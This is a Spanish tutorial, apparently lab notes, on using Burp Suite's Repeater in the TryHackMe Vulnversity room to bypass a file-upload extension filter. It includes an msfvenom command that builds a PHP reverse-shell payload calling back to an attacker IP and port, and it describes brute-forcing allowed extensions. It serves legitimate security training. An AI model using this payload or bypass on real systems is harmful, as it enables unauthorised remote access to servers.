Maquinas a utilizar **Kali Linux y Laboratorio de Try Hack Me Vulnversity** https://tryhackme.com/room/vulnversity  
  

Una vez hayamos interceptado una petición HTTP con burp suite, es posible que necesitemos realizar diversas comprobaciones dentro de una petición para encontrar la vulnerabilidad; y para ello disponemos del **repeater**. De tal forma que podremos modificar de forma cómoda las peticiones e ir enviándolas al servidor web para analizar sus respuestas.

  

- Vamos a aplicar antes de nada un pequeño ajuste dentro del navegador web.
    
    **Ajustes → Settings**
    
    **General→ Network Settings**
    
    **Manual proxy configuration**
    
    **HTTP Proxy: 127.0.0.1 Port: 8080**
    
      
    
- Activamos la interceptación en BurpSuite
    
    **Proxy → intercept on**
    
      
    
- Subimos el archivo malicioso que habíamos creado con el siguiente comando:
    
    ```Bash
    msfvenom -p php/reverse_php LHOST=10.21.166.149 LPORT=443 -f raw > pwned2.php 
    ```
    
    ![[Imagenes/image 36.png|image 36.png]]
    
    ![[Imagenes/image 1 25.png|image 1 25.png]]
    

  

- **¿Qué pasaría si no se que extensión poner al archivo?**
    
    ![[Imagenes/image 2 24.png|image 2 24.png]]
    

  

- Para eso tenemos la opción de **Repeater.** Tenemos dos formas de acceder a Repeater.
    1. Haciendo un **clip derecho** y pulsar en **Send to Repeter**.
        
        ![[Imagenes/image 3 23.png|image 3 23.png]]
        

1. Pulsando **CTRL+R**

  

- Haciendo esto hemos enviado la petición al apartado Repeater.
    
    ![[Imagenes/image 4 22.png|image 4 22.png]]
    
      
    
    Si cambiar nada pulsamos enviamos la petición pulsando el botón **Send,** vemos que nos llega la respuesta. Y podemos observar que nos devuelve Extensión no permitida.
    
    ![[Imagenes/image 5 21.png|image 5 21.png]]
    

Podemos ir probando distintas extensiones y ver si la respuesta cambia. Por ejemplo vamos a ponerle extensión TXT la enviamos.

![[Imagenes/image 6 19.png|image 6 19.png]]

Lo interesante aquí es **probar extensión por extensión hasta acertar**.

![[Imagenes/image 7 17.png|image 7 17.png]]

Aquí lo hemos hecho con extensiones pero podríamos probar con cualquier parámetro de la petición hasta acertar que nos permita el cambio.

  

- Nos vamos al **apartado de proxy** le ponemos la **extensión correcta** que hemos averiguado con el Repeater y le daríamos a **Forward.**